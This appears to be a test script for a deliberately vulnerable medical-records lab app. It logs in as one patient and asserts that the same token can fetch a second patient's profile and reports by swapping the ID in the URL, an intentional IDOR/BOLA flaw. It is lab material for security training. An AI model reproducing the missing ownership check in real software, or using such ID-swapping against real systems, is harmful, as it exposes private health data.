"""Verification script for Task 3.1 / V01: Broken Object-Level Authorisation (IDOR / BOLA)."""

import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi.testclient import TestClient
from backend.app.main import app

def main():
    client = TestClient(app)

    # 1. Authenticate as patient01
    login_resp = client.post(
        "/api/auth/login",
        json={"email": "patient01@medivault.test", "password": "Password123!"},
    )
    assert login_resp.status_code == 200, f"Login failed: {login_resp.text}"
    token = login_resp.json()["access_token"]
    user_info = login_resp.json()["user"]
    assert user_info["email"] == "patient01@medivault.test"
    assert user_info["patient_id"] == "PAT-100001"
    print(f"[+] Successfully authenticated as {user_info['email']} ({user_info['patient_id']})")

    # 2. Exploit V01 IDOR: patient01 requests PAT-100002 (patient02's profile)
    profile_resp = client.get(
        "/api/patients/PAT-100002",
        headers={"Authorization": f"Bearer {token}"},
    )
    assert profile_resp.status_code == 200, f"Failed IDOR profile access: {profile_resp.text}"
    p2_data = profile_resp.json()
    assert p2_data["patient_id"] == "PAT-100002", f"Unexpected patient_id: {p2_data}"
    assert p2_data["full_name"] == "Priya Patel", f"Unexpected full_name: {p2_data}"
    assert p2_data["blood_group"] == "O+", f"Unexpected blood_group: {p2_data}"
    print(f"[+] V01 Profile IDOR verified: patient01 accessed {p2_data['patient_id']} ({p2_data['full_name']})")

    # 3. Exploit V01 IDOR: patient01 requests PAT-100002 (patient02's reports)
    reports_resp = client.get(
        "/api/patients/PAT-100002/reports",
        headers={"Authorization": f"Bearer {token}"},
    )
    assert reports_resp.status_code == 200, f"Failed IDOR reports access: {reports_resp.text}"
    p2_reports = reports_resp.json()
    assert isinstance(p2_reports, list), f"Expected list of reports: {p2_reports}"
    assert len(p2_reports) >= 1, "Expected at least 1 report for PAT-100002"
    assert all(r["patient_id"] == "PAT-100002" for r in p2_reports)
    print(f"[+] V01 Reports IDOR verified: patient01 accessed {len(p2_reports)} reports for PAT-100002")

    # 4. Verify unauthenticated access is still rejected (401)
    unauth_resp = client.get("/api/patients/PAT-100002")
    assert unauth_resp.status_code == 401, f"Expected 401 for unauth, got: {unauth_resp.status_code}"
    print("[+] Unauthenticated requests properly rejected (401)")

    # 5. Non-existent patient returns 404
    notfound_resp = client.get(
        "/api/patients/PAT-999999",
        headers={"Authorization": f"Bearer {token}"},
    )
    assert notfound_resp.status_code == 404, f"Expected 404 for nonexistent, got: {notfound_resp.status_code}"
    print("[+] Non-existent patient ID properly returns 404")

    print("\n[SUCCESS] Task 3.1: V01 IDOR / BOLA verified successfully!")

if __name__ == "__main__":
    main()
